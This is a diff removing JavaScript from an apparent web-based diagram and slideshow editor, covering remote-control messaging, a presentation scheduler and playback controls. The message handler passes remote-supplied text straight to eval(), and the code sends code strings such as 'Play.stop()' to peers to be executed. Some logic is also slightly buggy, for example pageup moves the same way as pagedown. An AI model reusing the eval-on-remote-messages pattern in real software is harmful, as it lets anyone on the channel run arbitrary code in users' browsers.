-        var zz = textmsg[1725].split(/@/);
-        var seg = m.msg.split(/\|/);
-        var x = textmsg[1646].split(/@/);
-        for (var i=1; i < 4; i++)
-        seg[i] = seg[i].replace(/<table/, '<table width=100% border=1 style=border-collapse:collapse;border-radius:3px;background-color:white');
-        myprompt("<body style=\"font-family:" + myfontname + "\"><table id=snap border=1  cellspacing=4px cellpadding=3  style=background-color:white;border-collapse:collapse><tr><td>" + zz[0] + "</td><td>" + zz[1] + "</td><td>" + zz[2] + "</td><td>" + zz[3] + "</td><td>" + zz[4] + "</td><td>" + zz[5] + "</td></tr></table>");
-        var tbl0 =  $('snap');
-
-           var r = tbl.insertRow(-1);
-           var c = r.insertCell(-1);
-           c.colSpan = 6;
-           c.innerHTML =  ("<table width=98%><tr><td>" + x[0] +seg[1]+ "</td></tr> <tr><td>" + x[1] +seg[2]+ "</td></tr><tr><td>" + x[2] +seg[3]+ "</td></tr></table>");
-
-    }
-}
-Msg.handleget = function(s)
-{
-    if (s == '')  return  ;
-    usingremote = true;
-    var m = new Message(s);
-    Msg.rid = m.sid;
-    Msg.needmore = true;
-    if (m.code == 'join')
-    {
-        Play.remoteway = 3;
-        closeprompt();
-    }
-    else if (m.code == 'login')
-    {
-        window.open('login.jsp?follow=' + m.msg, 'w' + Msg.tstmp);
-        Msg.needmore = false;
-    }
-    else  if (m.code == "plain")
-    {
-        Play.remoteway = 3;
-        if (promptwin!=null && promptwin.innerHTML.indexOf(textmsg[1771].split(/@/)[6])>0)
-            closeprompt();
-        eval( m.msg );
-        Msg.needmore = true;
-    }
-    else  if (m.code == "leave")
-    {
-        Msg.send({code:'unsubs',msg:tstmp});
-        Msg.needmore = false;
-        usingremote = false;
-        myprompt("Remote control ended");
-    }
-}
-var usingremote = false;
-var oldcropuse = ResizeUploaded.cropuse;
-ResizeUploaded.cropuse = function(t)
-{
-    oldcropuse(t);
-    if (t == null || t==1)
-    {
-        appendfileto();
-    }
-}
-var olddrawbw = ResizeUploaded.readbw;
-ResizeUploaded.readbw = function()
-{
-    olddrawbw();
-    appendfileto();
-}
-var closeprompt1 = closeprompt;
-closeprompt = function()
-{
-    closeprompt1();
-    canceldia(numbeing,cdbeing);
-}
-function showonlinetool(num)
-{
-    onlinetoolbase.style.visibility='visible';
-    onlinetoolbarfollow($('e' + num ));
-    oldonlinetoolmini($('tosmall'));
-    var t = $('t' + num);
-    var xy = findPositionnoScrolling(t);
-    onlinetoolbase.style.top = (xy[1]-25) + 'px';
-    onlinetoolbase.style.left = ( xy[0]) + 'px';
-    onlinetoolbase.style.zIndex = '' + (2*numShapes + 4);
-}
-var oldonlinetoolmini = onlinetoolmini;
-onlinetoolmini = function(t)
-{
-    if( t.value =='.')
-    {
-       oldonlinetoolmini(t);
-       onlinetoolbase.style.visibility = "hidden";
-    }
-    else
-    {
-        oldonlinetoolmini(t);
-    }
-
-}
-
-var Play =
-{
-    starttime: 0,
-    idletime: 0,
-    startunit: 0,
-    handle: null,
-    shorttime: 0,
-    current: 'stop',
-    state: 'begin',
-    sel: null,
-    nopath: ";stop,pause;stop,forward;stop,backward;stop,resume;start,resume;resume,resume;pause,start;pause,forward;pause,backward;pause,pause;forward,resume;backward,resume;",
-    color: function (s)
-    {
-        var sel = $('selplay').getElementsByTagName('table')[0];
-        for (var i = 0; i < 6; i++)
-        {
-            var x =  (''+sel.rows[i].cells[0].outerHTML).replace(/.*Play\.([a-z]+).*/, '$1');
-
-            if (Play.nopath.indexOf(";" + s + ',' + x + ";") >= 0)
-                 sel.rows[i].cells[0].style.color = '#cddcc2';
-            else
-                sel.rows[i].cells[0].style.color = colors[menufontcolor];//colors[menufontcolor];
-        }
-    },
-    reinit: function (td)
-    {
-        var total = 75;
-        if (td != null)
-        {
-            total = parseInt(td.parentNode.cells[1].innerHTML);
-        }
-        var lens = [];
-        var W = 0;
-         
-        var xx = ',';
-        for (var k=0; k < allies[pagenum].length; k++)
-        {
-            if (allies[pagenum][k].charAt(0)!='c')
-            xx +=  allies[pagenum][k] + ','; 
-        }
-        for (var i = 0; i < numShapes; i++)
-        {
-            if (xx.indexOf(',' + i + ',')  < 0) xx +=  i + ",";
-        }
-        var yy =  xx.replace(/^,/,'').replace(/,$/,'').split(/,/);
-        var jj = 0,ll=0; 
-        for (k = 0; k < yy.length; k++)
-        {
-            var i = parseInt(yy[k]);
-            if (allShapes[i] == null)
-                continue;
-            var j = allShapes[i].words.replace(/<[a-b]+[^>]*>/ig, '').replace(/<\/[a-b|0-9]+>/ig, '').length;
-            if (j < 2 && allShapes[i].words.indexOf("http") == 0)
-            {
-                j = 50;
-            }
-            lens[i] = j;
-            W += j;
-        }
-         
-        var r = total / W;
-        var p = 0;
-        var sum = [], min = [], zo=[];
-        for (k = 0; k < yy.length; k++)
-        {
-            var i = parseInt(yy[k]);
-            if (allShapes[i] == null)
-                continue;
-            var j = whichally(i,1);
-            var d = Math.round(r * lens[i]*10)/10;
-            if (d == 0)
-                d = 0.1;
-             
-            if (j > -1)
-            {  
-                if (sum[j]==null) sum[j] = d; else  sum[j] += d;
-                if (min[j]==null) min[j] = p; else if (p > min[j]) min[j] = p;
-                if (zo[j] == null) zo[j] = i;
-            }
-            else
-            {
-                allShapes[i].time = d;
-                allShapes[i].start = p;
-                allShapes[i].zindex = ''+i;
-            }
-            p += d;
-        }
-        for (k = 0; k < yy.length; k++)
-        {
-            var i = parseInt(yy[k]);
-            if (allShapes[i] == null)
-                continue;
-            var j = whichally(i,1);
-            if (j == -1) continue;
-            allShapes[i].time = sum[j];
-            allShapes[i].start = min[j];
-            allShapes[i].zindex = ''+zo[j];
-        }
-        for (var i = 0; i < numLines; i++)
-        {
-            var l = allLines[i];
-            if (l == null )
-                continue;
-            var k = l.startnum;
-            var j = l.endnum;
-            if (k == -1 || j == -1)
-            {
-                if (l.time == 2)
-                    l.time = total;
-                continue;
-            }
-            var dk = allShapes[k].start + allShapes[k].time;
-            var dj = allShapes[j].start + allShapes[j].time;
-
-            if (dk > dj)
-            {
-                allShapes[j].time += (dk - dj);
-            } else if (dk < dj)
-            {
-                allShapes[k].time += (dj - dk);
-            }
-        }
-
-        if (td != null)
-        {
-            Play.schedule();
-        }
-    },
-    speedup:1,
-
-    schedule: function (simple)
-    {
-        var m = 0;
-        for (var i = 0; i < numShapes; i++)
-        {
-            if (allShapes[i] == null)
-                continue;
-            var d = allShapes[i].start + allShapes[i].time;
-            if (m < d)
-                m = d;
-        }
-        for (var i = 0; i < numLines; i++)
-        {
-            if (allLines[i] == null || allLines[i].startnum>-1 || allLines[i].endnum>-1)
-                continue;
-            var d = allLines[i].start + allLines[i].time;
-            if (m < d)
-                m = d;
-        }
-        for (var i = 0; i < numCurves; i++)
-        {
-            if (allCurves[i] == null )
-                continue;
-            var d = allCurves[i].start + allCurves[i].time;
-            if (m < d)
-                m = d;
-        }
-        var sim = '';
-        var xs = textmsg[1772].split(/@/);
-        var x = "<table align=center  ><tr><td   style=color:purple;font-size:14px;float:center>" + xs[7] + "</td></tr></table><table align=center  border=1 style=\"width:100%;border-collapse:collapse\"><tr><td  align=left bgcolor=lightblue><nobr><b>" + xs[8] + "</b></nobr></td><td id=totaltime align=center onclick=changeplaytime(this) bgcolor=white  width=50>" + d1(m) + "</td><td  align=center style=color:blue onclick=Play.reinit(this)><nobr>" + xs[9] + "</nobr></td><td align=center style=color:black  bgcolor=lightblue><nobr>" + xs[10] + "</nobr></td>"
-                +"<td onclick=Play.changespeedup(this,-1) style=\"background-color:white;color:blue;font-weight:700\"  width=17>&lt;</td><td id=speednum align=center   bgcolor=transparent  width=17>" + Play.speedup + "</td><td onclick=Play.changespeedup(this,1) style=\"background-color:white;color:blue;font-weight:700\"  width=17>&gt;</td></tr></table>";
-        x += "<table align=center border=1 style=\"border-collapse:collapse;margin:3px 0px 1px 0px\"><tr bgcolor=lightblue><td><nobr><b>" + xs[0] + "</b></nobr></td><td><nobr><b>" + xs[6] + "</b></nobr></td><td><nobr><b>" + xs[1] + "</b></nobr></td><td align=right><nobr><b>" + xs[2] + "</b></nobr></td><td align=right><nobr><b>" + xs[3] + "</b></nobr></td><td><nobr><b>" + xs[4] + "</b></nobr></td><td><nobr><b>" + xs[11] + "</b></nobr></td></tr>";
-        var xx = ',';
-        if (allies[pagenum]!=null)
-        for (var k=0; k < allies[pagenum].length; k++)
-        {
-            if (allies[pagenum][k].charAt(0)!='c')
-            xx +=  allies[pagenum][k] + ','; 
-        }
-        for (var i = 0; i < numShapes; i++)
-        {
-            if (xx.indexOf(',' + i + ',')  < 0) xx +=  i + ",";
-        }
-        var yy =  xx.replace(/^,/,'').replace(/,$/,'').split(/,/);
-        var jj = 0,ll=0; 
-        var bc = setdocbg1(); 
-        for (k = 0; k < yy.length; k++)
-        {
-            var i = parseInt(yy[k]);
-            jj = whichally(i,1); 
-            ll = ''; if (jj > -1) ll = ':' + jj;
-            if (allShapes[i] == null)
-                continue;
-            if (simple == null)
-            {
-                var l = allShapes[i].words.length;
-                if (l > 15)
-                    l = 15;
-                var cln = '',bgc='';
-
-                if (allShapes[i].bcolor>9)
-                {
-                    cln = ' class=shapebg' + (allShapes[i].bcolor-10) + " ";
-                } 
-                else if (allShapes[i].bcolor < 8)
-                   bgc = ';background-color:' + bcolors[allShapes[i].bcolor];
-
-                var str;
-                if (allShapes[i].shapename == 'circle')
-                    str ='<div ' + cln + ' style="width:15px;height:15px' + bgc + ';border-radius: 50%"></div>';
-                else if (allShapes[i].shapename == 'egg')
-                    str = '<div ' + cln + ' style="width:15px;height:10px' + bgc + ';border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;"></div>';
-                else if (allShapes[i].shapename == 'hexgon')
-                    str = '&#11041;';
-                else if (allShapes[i].shapename == 'clouds')
-                    str = '&#x2601;';
-                else  if (allShapes[i].shapename == 'ellipse')
-                   str = '<div ' + cln + ' style="width:15px;height:10px' + bgc + ';border-radius: 50%/50%;"></div>';
-                else if (allShapes[i].shapename == 'diamond')
-                    str =  '<div ' + cln + ' style=transform:scale(1.8,0.9);color:inherit >&diams;</div>';
-                else if (allShapes[i].shapename == 'roundrect')
-                    str = "<div " + cln +  " style=\"width:14px;height:10px" + bgc + ";border-radius:3px;border:1px " + colors[allShapes[i].color] + " solid\"><!----></div>";
-                else
-                    str = "<div " + cln + " style=\"width:14px;height:10px" + bgc + ";border:1px " + colors[allShapes[i].color] + " solid;\"><!----></div>";
-
-                x += "<tr  bgcolor=lightyellow><td valign=middle style=color:#113344 align=right >" + i  + ll + "</td>";
-                x += "<td  align=center " + bc[0] + " style=\"" + bc[1] + ";color:" + bcolors[allShapes[i].bcolor] + "\" ><nobr>" + str + "</nobr></td>";
-                x += "<td  align=left  style=color:" + colors[allShapes[i].color] + "><nobr>" + allShapes[i].words.substring(0, l) + "</nobr></td>";
-                x += "<td align=right  bgcolor=white ><table bgcolor=white align=right cellspacing=0 cellpadding=0><tr><td valign=middle align=right  bgcolor=white  onclick=changeord(this," + i + ",1)>" + Math.floor(allShapes[i].start) + "</td><td valign=middle align=right  bgcolor=white  onclick=changedecimal(this," + i + ",'o',1) width=20>." + Math.round((allShapes[i].start-Math.floor(allShapes[i].start))*10)  + "</td></tr></table></td>";
-                x += "<td align=right  bgcolor=white ><table  bgcolor=white align=right cellspacing=0 cellpadding=0><tr><td valign=middle align=right  bgcolor=white  onclick=changetm(this," + i + ",1)>" + Math.floor(allShapes[i].time) + "<td valign=middle align=right  bgcolor=white  onclick=changedecimal(this," + i + ",'t',1) width=20>." + Math.round((allShapes[i].time-Math.floor(allShapes[i].time))*10)  + "</td></tr></table></td>";
-                x += "<td valign=middle align=right  bgcolor=white  onclick=changeZ(this," + i + ",1)>" + allShapes[i].zindex + "</td>";
-                x += "<td valign=middle align=right  bgcolor=white style=color:blue onclick=mmdia(" + i + ",1)> &gt;&gt; </td>"; 
-                x +="</tr>";
-            }
-            else{
-                var cl = ''; 
-                if (allShapes[i].bcolor==8) 
-                    cl = 'transparent';
-                else if (allShapes[i].bcolor<8) 
-                    cl = bcolors[allShapes[i].bcolor];
-                sim += i+ ll + ","; 
-                sim += allShapes[i].shapename + "."   + cl.replace(/#/,'') + ","; 
-                sim +=  allShapes[i].words.length + ","; 
-                sim +=  allShapes[i].start.toFixed(2)  + ","; 
-                sim +=  allShapes[i].time.toFixed(2) + ","; 
-                sim +=  allShapes[i].zindex + ";";
-            
-            }
-        }
-         for (var i = 0; i < numLines; i++)
-        {
-            if (allLines[i] == null || allLines[i].startnum>-1 || allLines[i].endnum>-1)
-                continue;
-            var pn = picname(allLines[i].type);
-            if (pn == '') pn = '---';else if (pn=='arrow'||pn=='>') pn = '&rarr;';
-             else if (pn == 'm') pn = '--m';else   pn = '--'+pn;
-            var str = "--";
-            if (simple == null)
-            {
-                x += "<tr  bgcolor=lightyellow><td valign=middle  style=color:#113344  align=right >" + i  +   "</td>";
-                x += "<td  align=center  " + bc[0] + " style=\"" + bc[1] + ";" + colors[allLines[i].color] + "\"><nobr>" + pn + "</nobr></td>";
-                x += "<td  align=left style=color:" + colors[allLines[i].color] + ">(" + allLines[i].sx + "," + allLines[i].sy + ")</td>";
-                x += "<td align=right  bgcolor=white ><table bgcolor=white align=right cellspacing=0 cellpadding=0><tr><td valign=middle align=right  bgcolor=white  onclick=changeord(this," + i + ",2)>" + Math.floor(allLines[i].start) + "</td><td valign=middle align=right  bgcolor=white  onclick=changedecimal(this," + i + ",'o',2) width=20>." + Math.round((allLines[i].start-Math.floor(allLines[i].start))*10)  + "</td></tr></table></td>";
-                x += "<td align=right  bgcolor=white ><table  bgcolor=white align=right cellspacing=0 cellpadding=0><tr><td valign=middle align=right  bgcolor=white  onclick=changetm(this," + i + ",2)>" + Math.floor(allLines[i].time) + "<td valign=middle align=right  bgcolor=white  onclick=changedecimal(this," + i + ",'t',2) width=20>." + Math.round((allLines[i].time-Math.floor(allLines[i].time))*10)  + "</td></tr></table></td>";
-                x += "<td valign=middle align=right  bgcolor=white  onclick=changeZ(this," + i + ",2)>" + allLines[i].zindex + "</td>";
-                x += "<td valign=middle align=right  bgcolor=white style=color:blue onclick=mmdia(" + i + ",2)> &gt;&gt; </td>"; 
-                x +="</tr>";
-            }
-            else
-                sim += i + "," + pn.replace(/&/,'@').replace(/;/,'') + "." 
-                    + colors[allLines[i].color].replace(/#/,'') + "," 
-                    + Math.round(Math.sqrt((allLines[i].sx-allLines[i].ex)*(allLines[i].sx-allLines[i].ex) + (allLines[i].sy-allLines[i].ey)*(allLines[i].sy-allLines[i].ey))).toFixed(0) + "," 
-                    + allLines[i].start.toFixed(2) + "," 
-                    + allLines[i].time.toFixed(2) + "," 
-                    + allLines[i].zindex + ";";
-        }
-        xx = ',';
-        
-        for (var k=0; k < allies[pagenum].length; k++)
-        {
-            if (allies[pagenum][k].charAt(0)=='c')
-            xx +=  allies[pagenum][k].replace(/^c,/,'') + ','; 
-        }
-        for (var i = 0; i < numCurves; i++)
-        {
-            if (xx.indexOf(',' + i + ',')  < 0) xx +=  i + ",";
-        }
-        var yy =  xx.replace(/^,/,'').replace(/,$/,'').split(/,/);
-        var jj = 0,ll=0; 
-        for (k = 0; k < yy.length; k++)
-        {
-            var i = parseInt(yy[k]);
-            jj = whichally(i,4); 
-            if (jj==-1) ll = '';
-            else ll = ':' + jj;
-            if (allCurves[i] == null)
-                continue;
-            var pn = '';
-            if (allCurves[i].type=='curve') pn = "&ac;";
-            else if(allCurves[i].type=='mline') pn = "&ang;";
-            else if (allCurves[i].type=='dotted') pn = "&homtht;";
-            else if (allCurves[i].type=='dotline') pn = "&there4;";
-            else if (allCurves[i].type=='smooth') pn = "&acd;";
-            else pn = "&minusd;";
-            if (simple == null)
-            {
-                x += "<tr  bgcolor=lightyellow><td valign=middle  style=color:#114444  align=right >" + i  + ll+  "</td>";
-                x += "<td  align=center  " + bc[0] + " style=\"" + bc[1] + ";color:" + colors[allCurves[i].color] + "\"><nobr>" + pn + "</nobr></td>";
-                x += "<td  align=left style=color:" + colors[allCurves[i].color] + ">(" + allCurves[i].points[0][0] +","+ allCurves[i].points[0][1] + ")</td>";
-                x += "<td align=right  bgcolor=white ><table bgcolor=white align=right cellspacing=0 cellpadding=0><tr><td valign=middle align=right  bgcolor=white  onclick=changeord(this," + i + ",4)>" + Math.floor(allCurves[i].start) + "</td><td valign=middle align=right  bgcolor=white  onclick=changedecimal(this," + i + ",'o',4) width=20>." + Math.round((allCurves[i].start-Math.floor(allCurves[i].start))*10)  + "</td></tr></table></td>";
-                x += "<td align=right  bgcolor=white ><table  bgcolor=white align=right cellspacing=0 cellpadding=0><tr><td valign=middle align=right  bgcolor=white  onclick=changetm(this," + i + ",4)>" + Math.floor(allCurves[i].time) + "<td valign=middle align=right  bgcolor=white  onclick=changedecimal(this," + i + ",'t',4) width=20>." + Math.round((allCurves[i].time-Math.floor(allCurves[i].time))*10)  + "</td></tr></table></td>";
-                x += "<td valign=middle align=right  bgcolor=white  onclick=changeZ(this," + i + ",4)>" + allCurves[i].zindex + "</td>";
-                x += "<td valign=middle align=right  bgcolor=white style=color:blue onclick=mmdia(" + i + ",4)> &gt;&gt; </td>"; 
-                x +="</tr>";
-            }
-            else
-                sim += i + ll + ",c"   + pn.replace(/&/,'@').replace(/;/,'') + "."+ colors[allCurves[i].color].replace(/#/,'') +"," + allCurves[i].points.length + "," + allCurves[i].start.toFixed(2) + "," + allCurves[i].time.toFixed(2) + "," + allCurves[i].zindex +";";
-        }
-        if (simple == null)
-            myprompt(x + "</table>", null, null, xs[5]);
-        else
-            return sim;
-    },
-    changespeedup: function(s, k)
-    {
-        Play.speedup += k;
-        if (Play.speedup==0) Play.speedup = 1;
-        if (Play.speedup==7 || Play.speedup==9 || Play.speedup==11) Play.speedup += k;
-        if (Play.speedup >= 13) Play.speedup = 12;
-        s.parentNode.cells[5].innerHTML = '' + Play.speedup;
-
-    },
-    navpagenum:-1,
-    pageicon:function()
-    {
-        makepagetab();
-    },
-    sendnewsch:function()
-    {
-        var y = Play.schedule(1);
-        Msg.send({code:'plain', msg:y});
-    },
-    select:function()
-    {
-       showbig(Play.navpagenum);
-       Play.navpagenum=-1;
-       Play.stop();
-       Play.sendnewsch();
-    },
-    pagedown:function()
-    {
-        if (Play.navpagenum==-1)
-            Play.navpagenum = pagenum;
-
-        var N = pagetbl.rows.length - 1;
-        var icon = $('icon' + Play.navpagenum);
-        if (icon!=null)
-        {
-        icon.style.backgroundColor = "white";
-        Play.navpagenum = (Play.navpagenum+1)%N;
-        icon = $('icon' + Play.navpagenum);
-        icon.style.backgroundColor = "#aaaaaa";
-        }
-    },
-    pageup:function()
-    {
-        if (Play.navpagenum==-1)
-        {
-            Play.navpagenum = pagenum;
-        }
-
-        var N = pagetbl.rows.length - 1;
-        var icon = $('icon' + Play.navpagenum);
-        if (icon!=null)
-        {
-        icon.style.backgroundColor = "white";
-        Play.navpagenum = (Play.navpagenum+1)%N;
-        icon = $('icon' + Play.navpagenum);
-        icon.style.backgroundColor = "#aaaaaa";
-        }
-    },
-    stop: function ()
-    {
-        if (!Play.cando('stop'))
-            return;
-        Play.hideother(false,false);
-        Play.current = 'stop';
-        Play.color('stop');
-        if (Play.handle != null)
-            clearInterval(Play.handle);
-        Play.handle = null;
-        Play.starttime = 0;
-
-        for (var i = 0; i < numShapes; i++)
-        {
-            if (allShapes[i] != null)
-            {
-                allShapes[i].visible = 1;
-                hideshow(i);
-            }
-        }
-        for (i = 0; i < numLines; i++)
-        {
-            if (allLines[i] != null)
-            {
-                allLines[i].visible = 0;
-                hideLine(i);
-            }
-        }
-        sendObject(-2,'Play.stop()');
-       
-    },
-    stopfordel: function ()
-    {
-        if (!Play.cando('stop'))
-            return;
-        Play.hideother(false,true);
-        Play.current = 'stop';
-        Play.color('stop');
-        if (Play.handle != null)
-            clearInterval(Play.handle);
-        Play.handle = null;
-        Play.starttime = 0;
-        sendObject(-2,'Play.stop()');
-    },
-    numob:0,
-    cando: function (str)
-    {
-        var x = ";" + Play.current + "," + str + ";";
-        var y = Play.nopath.indexOf(x);
-        return (y < 0);
-    },
-    backward: function ()
-    {
-        if (!Play.cando('backward'))
-            return;
-        Play.current = 'backward';
-        Play.color('backward');
-        
-        if (Play.pregress == 1)
-        {
-            if (Play.handle != null)
-            {
-            clearInterval(Play.handle);
-            Play.handle = null;
-            }
-            Play.pregress = 0;
-            Play.prevpage();
-        } 
-        else
-        {
-           for (var i = 0; i < numShapes; i++)
-          {
-           allShapes[i].base.style.animation = null;
-           allShapes[i].base.style.visibility = 'hidden';
-           allShapes[i].visible = 0;
-          }
-          for (var i = 0; i < numLines; i++)
-          {
-             allLines[i].visible = 1;
-             hideLine(i);
-          }
-          if (Play.handle != null)
-            {
-            clearInterval(Play.handle);
-            Play.handle = null;
-            }
-           var N = Play.pregress-2;
-           Play.pregress = 0;
-           for (var j=0; j < N; j++)
-               Play.playsh(false);
-           Play.playsh();
-           Play.handle = setInterval(Play.playsh, 6000/Play.speedup);
-        }
-         sendObject(-2,'Play.backward()');
-    },
-    forward: function ()
-    {
-        if (!Play.cando('forward'))
-            return;
-        Play.current = 'forward';
-        Play.color('forward');
-        if (Play.handle != null)
-        {
-            clearInterval(Play.handle);
-            Play.handle = null;
-        }
-        while (Play.pregress<Play.showbar.length || Play.pregress<Play.hidebar.length)
-        {
-            if (Play.showbar[Play.pregress]==null && Play.hidebar[Play.pregress]==null)
-                Play.pregress++;
-            else break;
-        }
-        if (Play.pregress<Play.hidebar.length)
-        {
-            Play.playsh();
-            if (Play.handle != null)
-            {
-                clearInterval(Play.handle);
-            }
-            Play.handle = setInterval(Play.playsh, Math.round(6000/Play.speedup));
-        }
-        else
-        {
-            if (Play.handle != null)
-            {
-                clearInterval(Play.handle);
-            }
-            Play.nextpage();
-        }
-        sendObject(-2,'Play.forward()');
-    },
-    tblhtml:[],
-    hideother:function(b,big)
-    {
-       if (editable == false) return;
-       var tds = ['tdfile','tdclip', 'tdline','tdcurve','tdbg','tdcf','tdicon'];
-       if (big)
-           tds = ['tdfile','tdclip','tdpage', 'tdline','tdcurve','tdbg','tdcf','tdicon','tdcord'];
-       var tbl = $("toolbar");
-       if (b)
-       for (var j=0; j < tbl.rows[0].cells.length; j++)
-       {
-           Play.tblhtml[j] = tbl.rows[0].cells[j].innerHTML;
-       }
-       for (var j=0; j < tds.length; j++)
-       {
-           var x = $(tds[j]);
-           if (x!=null )
-           {
-               tbl = x.parentNode.parentNode.parentNode;
-               x.style.visibility = b?'hidden':'visible';
-           }
-       }
-       if (b)
-       {
-           var k=1;
-           for (var j=0; j < tbl.rows[0].cells.length; j++)
-           {
-               var xx = tbl.rows[0].cells[j].id;
-               if (tds.includes(xx))
-              {
-                 tbl.rows[0].cells[j].innerHTML = '';
-                 tbl.rows[0].cells[j].width = 0;
-              }
-           }
-       }
-       else
-       {
-           for (var j=0; j < tbl.rows[0].cells.length; j++)
-           {
-              if (tbl.rows[0].cells[j].innerHTML=='')
-              {
-                  tbl.rows[0].cells[j].innerHTML = Play.tblhtml[j];
-                  tbl.rows[0].cells[j].width = ''; 
-              }
-           }
-       }
-    },
-    prevpage: function ()
-    {
-        if (pagenum > 0)
-        {
-            Play.stop();
-            changepage(pagetbl.rows[pagenum-1].cells[0]);
-            Play.play();
-        } else if (Play.handle != null)
-        {
-            clearInterval(Play.handle);
-            Play.handle = null;
-        }
-        if (usingremote)Play.sendnewsch();
-        return;
-    },
-    nextpage: function ()
-    {
-        if (pagenum < pagetbl.rows.length-2)
-        {
-            Play.starttime == 0;
-            var xt = pagetbl.rows[pagenum+1].cells[0];
-            var xx = xt.innerHTML;
-            changepage(xt);
-            Play.start();
-        } else if (Play.handle != null)
-        {
-            clearInterval(Play.handle);
-            Play.handle = null;
-        }
-        $('selpage').style.visibility = 'hidden';
-        if (usingremote)Play.sendnewsch();
-        return;
-    },
-    keepgoing:false,
-    pause: function ()
-    {
-        if (Play.starttime == 0)
-            return;
-        if (!Play.cando('pause'))
-            return;
-        Play.current = 'pause';
-        Play.color('pause');
-        Play.keepgoing = false;
-        Play.idletime = (new Date()).getTime();
-        Play.shorttime = Play.idletime - Play.startunit;
-         sendObject(-2,'Play.pause()');
-    },
-    resume: function ()
-    {
-        if (Play.starttime == 0)
-            return;
-        if (!Play.cando('resume'))
-            return;
-        Play.current = 'resume';
-        Play.color('resume');
-        var rightnow = (new Date()).getTime();
-        Play.starttime += rightnow - Play.idletime;
-        Play.startunit += rightnow - Play.idletime;
-        Play.keepgoing = true;
-       // setTimeout(Play.play, 6000/Play.speedup - Play.shorttime%(6000/Play.speedup));
-        sendObject(-2,'Play.resume()');
-    },
-    showbar:[],
-    hidebar:[],
-    lengthy:[],
-    updatesch: function()
-    {
-       Play.showbar=[];
-       Play.hidebar=[];
-       Play.lengthy=[];
-       for (var i = 0; i < numShapes; i++)
-       {
-           allShapes[i].base.style.animation = null;
-           allShapes[i].base.style.visibility = 'hidden';
-           var j = Math.round(allShapes[i].start/0.1);
-           var s = Play.showbar[j];
-           if (s == null) Play.showbar[j] = 's'+i;
-           else  Play.showbar[j] += ",s" + i;
-           j = Math.round((allShapes[i].start + allShapes[i].time)/0.1);
-           s = Play.hidebar[j];
-           if (s == null) Play.hidebar[j] = 's'+i;
-           else  Play.hidebar[j] += ",s" + i;
-       }
-       for (var i = 0; i < numCurves; i++)
-       {
-           if (allCurves[i]==null) continue;
-           var j = Math.round(allCurves[i].start/0.1);
-           var s = Play.showbar[j];
-           if (s == null) Play.showbar[j] = 'c'+i;
-           else  Play.showbar[j] += ",c" + i;
-           j = Math.round((allCurves[i].start + allCurves[i].time)/0.1);
-           s = Play.hidebar[j];
-           if (s == null) Play.hidebar[j] = 'c'+i;
-           else  Play.hidebar[j] += ",c" + i;
-           allCurves[i].hide();
-       }
-       for (var i = 0; i < numLines; i++)
-       {
-           if (allLines[i]==null || allLines[i].startnum>-1 || allLines[i].endnum > -1)
-               continue;
-           var j = Math.round(allLines[i].start/0.1);
-           var s = Play.showbar[j];
-           if (s == null) Play.showbar[j] = 'l'+i;
-           else  Play.showbar[j] += ",l" + i;
-           j = Math.round((allLines[i].start + allLines[i].time)/0.1);
-           s = Play.hidebar[j];
-           if (s == null) Play.hidebar[j] = 'l'+i;
-           else  Play.hidebar[j] += ",l" + i;
-           allLines[i].hide();
-       }
-       for (var k=0; k < Play.showbar.length; k++)
-       {
-           var j = 0, t=0;
-           Play.lengthy[k] = 1;
-           if (Play.showbar[k] == null) continue;
-           j = k+1;
-           while (j < Play.showbar.length && Play.showbar[j]==null && j < Play.hidebar.length && Play.hidebar[j]==null)
-           { Play.lengthy[k]++; j++;}
-       }
-       
-    },
-    start: function ()
-    {
-       Play.updatesch();
-       Play.hideother(true,false);
-        if (!Play.cando('start'))
-        {
-            alert('can not start');
-            return;
-        }
-        Play.current = 'start';
-        Play.color('start');
-        Play.starttime = 0;
-        if (Play.handle != null)
-            clearInterval(Play.handle);
-        
-        for (var i = 0; i < numLines; i++)
-        {
-            if (allLines[i] != null && (allLines[i].startnum>-1 || allLines[i].endnum>-1))
-            {
-                allLines[i].visible = 1;
-                hideLine(i);
-            }
-        }
-        Play.pregress = 0;
-        Play.keepgoing = true;
-        Play.playsh();
-        Play.handle = setInterval(Play.playsh, 6000/Play.speedup);
-        sendObject(-2,'Play.start()');
-       /* 33('end', Play.stop);
-        keymage('pagedown', Play.nextpage);
-        keymage('pageup', Play.prevpage);
-        keymage('right', Play.forward);
-        keymage('left', Play.backward);
-        keymage('left', Play.backward);*/
-        
-    },
-    pregress:0,
-    remaining:0,
-    playsh: function(nostopping)
-    {
-        if (Play.keepgoing == false) return;
-        var i = Play.pregress++;
-        var str =Play.showbar[i];  
-        if (str!=null)
-        {
-            var xs = str.split(/,/);
-            for (var j =0; j < xs.length; j++)
-            {
-                var type= xs[j].charAt(0);
-                var k = parseInt(xs[j].substring(1));
-                if (nostopping!=null || type != 's')
-                {
-                    if (type=='s')
-                       allShapes[k].visible = true;
-                    else if (type=='c')
-                    try{ allCurves[k].show();}catch(e){ }
-                    else 
-                       allLines[k].show();
-                }
-                else 
-                {
-                    allShapes[k].animates();
-                   
-                }
-            }
-            Play.remaining = Play.lengthy[i] ;
-        }
-        else
-        {
-            Play.remaining--;
-        }
-        var s = Math.round(Play.remaining*6/Play.speedup);
-        if (s > 60){ var m = (Math.floor(s/60));
-           cord.innerHTML = m + "'" + (s%60) + '"';}
-        else  cord.innerHTML = s + '"';
-        str =Play.hidebar[i]; 
-        var mx = 0;
-        if (str!=null)
-        {
-            var xs = str.split(/,/);
-            for (var j =0; j < xs.length; j++)
-            {
-                var type= xs[j].charAt(0);
-                var k = parseInt(xs[j].substring(1));
-                if (nostopping!=null || type != 's')
-                {   
-                    if (type=='s')
-                        allShapes[k].visible = false;
-                    else if (type=='c')
-                        try{ allCurves[k].hide();}catch(e){ }
-                    else allLines[k].hide();
-                }
-                else
-                {    
-                    allShapes[k].leaves();
-                    var kframe = kframes[pagenum + '_' + allShapes[k].num];
-                    if (kframe!=null)
-                    {
-                       var min = kframe.ltm;
-                       if (min > mx ) mx = min;
-                    }
-                }
-            }
-        }
-        if (Play.hidebar==null)
-        {
-           ; 
-        }
-        else  if (i < Play.hidebar.length-1)
-        {
-           ;
-        }
-        else
-        {
-            if (pagenum < shapearr.length - 1)
-            {
-                if (min == 0)
-                    Play.nextpage();
-                else 
-                    setTimeout(Play.nextpage, 1000*min);
-            }
-            else
-            {
-                clearInterval(Play.handle);
-            }
-        }
-    },
-    appear: function (n)
-    {
-       allShapes[n].visible = 1; 
-       allShapes[n].base.style.visibility = 'visible';
-    },
-    disappear: function (n)
-    {
-       allShapes[n].visible = 0; 
-       allShapes[n].base.style.visibility = 'hidden';
